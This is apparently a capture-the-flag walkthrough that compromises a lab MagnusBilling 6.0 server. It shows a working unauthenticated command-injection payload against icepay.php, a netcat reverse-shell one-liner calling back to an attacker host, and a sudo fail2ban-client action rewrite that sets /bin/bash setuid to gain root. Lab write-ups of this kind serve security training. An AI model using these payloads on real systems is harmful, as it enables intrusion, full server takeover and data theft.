## 🕵 Phase 1: Reconnaissance


#### Nmap Scanning
The engagement began with a comprehensive Nmap scan to identify open ports and services running on the target host:

```bash
└─$ nmap -n -Pn -T4 -p- -sV -sC 10.66.186.106
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)

|_  256 f2:cd:6b:4e:da:f2:ec:39:18:87:3e:5d:98:3c:93:cf (ED25519)

```
#### What are we looking at?
Essentially, this server is a complete telephony hub. It’s an "all-in-one" system designed to manage VoIP calls and billing from a single place.<br>
We have Asterisk doing the heavy lifting for the phone services behind the scenes, MagnusBilling acting as the front-end for administrators to manage accounts and credits, and a MariaDB database holding everything together in the background. It’s a well-updated Debian machine, likely serving as the backbone for a communication provider's operations.

Let's visit the homepage through the browser and see what's there.<br>
The system automatically redirects to the MagnusBilling application, though no specific version is displayed.

**Source Code Analysis:** Bootstrapping Process
"To begin the reconnaissance, I analyzed the initial HTML source code to identify how the application initializes its environment. I pinpointed the 'Microloader' script, which serves as the entry point for the ExtJS framework and is responsible for loading the application's configuration and metadata into memory."

```bash
 </script>
        <script data-app="66fb43d2-c53a-4317-ab77-8188ac019a5b" id="microloader" type="text/javascript">
            var Ext=Ext||{};Ext.manifest=Ext.manifest||"blue-neptune.json";Ext=Ext||{};....
```

After identifying the microloader script and the Ext.manifest reference in the static source code, I decided to verify how these components were being interpreted in real-time. Let's take a look at what the browser tells us about that. > By switching to the developer console and querying the live object, I was able to confirm the application's metadata directly from memory.

#### Revealed the app version >>> name: "MBilling", version: "6.0.0.0"

#### Searching for known vulnerabilities.

Description
A Command Injection vulnerability in MagnusBilling application 6.x and 7.x allows
remote attackers to run arbitrary commands via unauthenticated HTTP request.
A piece of demonstration code is present in `lib/icepay/icepay.php`, with a call to an exec().
The parameter to exec() includes the GET parameter `democ`, which is controlled by the user and
not properly sanitised/escaped.
After successful exploitation, an unauthenticated user is able to execute arbitrary OS commands.
The commands run with the privileges of the web server process, typically `www-data` or `asterisk`.
At a minimum, this allows an attacker to compromise the billing system and its database.

The following MagnusBilling applications are vulnerable:
- MagnusBilling application version 6 (all versions);
- MagnusBilling application up to version 7.x without commit 7af21ed620 which fixes this vulnerability;
```

### Proof of Concept: Endpoint Validation

Here we can assume that the file exists but does not return a response, meaning it is blind.

```bash
└─$ curl http://10.66.186.106/mbilling/lib/icepay/icepay.php?democ=echo%20%22test%22 -I
HTTP/1.1 200 OK
Date: Sat, 03 Jan 2026 19:11:56 GMT
Server: Apache/2.4.62 (Debian)
Content-Type: text/html; charset=UTF-8
```

Let's use a sleep.

```bash
└─$ time curl -s 'http://10.66.186.106/mbilling/lib/icepay/icepay.php?democ=;sleep+5;'

real    0m5,328s
user    0m0,011s
sys     0m0,005s
```
***Breaking down the payload***

To make this work, I structured the command to do a few specific things:<br>
Timing the response: I used the time command at the start to measure exactly how long the server takes to answer. This is my 'stopwatch'.<br>
The Semicolon trick: By using semicolons (;), I'm telling the server: 'Stop whatever you’re doing and run my command next.' The quotes around the URL ensure my own terminal doesn't get confused by these special characters.<br>
Safety net: I added a second semicolon at the very end to 'cancel out' any other code that might exist on the server's side, making sure my sleep command runs cleanly without errors.<br>
> The result? A 5-second delay that proves the server is doing exactly what I tell it to do."

#### Now ready to try a reverse shell.

```bash
└─$ curl -s -G 'http://10.66.186.106/mbilling/lib/icepay/icepay.php' --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc  <attacker_ip> 443 > /tmp/f;'
```

```bash
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.130.186] from (UNKNOWN) [10.66.186.106] 43828
sh: 0: can't access tty; job control turned off
$ 
```

### Privilege escalation, looking for a root flag.

We found something using suid, running as root.

```bash
asterisk@ip-10-66-186-106:/$ id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
asterisk@ip-10-66-186-106:/$ sudo -l
Matching Defaults entries for asterisk on ip-10-66-186-106:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-66-186-106:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
#### 🤔 😵‍💫 I’ll do some digging on fail2ban-client exploits.

The fail2ban-client is the CLI used to manage and configure the fail2ban-server. This security tool protects the system by monitoring logs for malicious activity and automatically blocking offending IPs via firewall rules. Since the server process runs as root, any ability to control the client with elevated privileges (via sudo) creates a high-risk path for full system compromise.

### 👊👊 Attacking, using fail2ban to change the suid of /bin/bash

The output confirms that the fail2ban-server is actively monitoring the system through 8 specific 'jails'. Each jail represents a set of rules and filters tailored to a particular service.
```bash
asterisk@ip-10-66-186-106:/$ sudo fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```
I checked the asterisk-iptables jail and found its specific action: iptables-allports-ASTERISK.
```bash
asterisk@ip-10-66-186-106:/$ sudo fail2ban-client get asterisk-iptables actions
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
```
The output shows the exact iptables syntax the server uses to ban an IP.
```bash
asterisk@ip-10-66-186-106:/$ sudo fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>
```

 I replaced the standard firewall rule with a command that grants permanent root access: chmod +s /bin/bash.

 ```bash
 asterisk@ip-10-66-186-106:/$ sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
chmod +s /bin/bash
```
I needed to force the system to execute it. I used the banip command to manually ban a dummy IP address (1.2.3.4).

```bash
asterisk@ip-10-66-186-106:/$ sudo fail2ban-client set asterisk-iptables banip 1.2.3.4
1
```
### triggering /bin/bash with suid and retrieving the root flag.

```bash
asterisk@ip-10-66-186-106:/$ /bin/bash -p
bash-5.2# id
uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root) groups=0(root),1001(asterisk)
bash-5.2# cd /root
bash-5.2# cat root.txt
THM{[redacted]}
bash-5.2# 
```
